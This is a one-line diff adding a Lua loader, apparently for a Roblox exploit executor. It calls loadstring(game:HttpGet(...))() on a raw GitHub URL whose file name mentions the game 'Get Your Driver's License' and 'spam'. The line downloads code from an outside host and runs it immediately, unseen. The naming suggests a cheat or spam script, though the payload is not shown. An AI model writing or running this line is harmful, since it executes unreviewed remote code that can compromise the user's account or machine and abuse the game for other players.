@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/get-your-driver-s-license-spam3-gsctk5axiffpt0.lua"))()
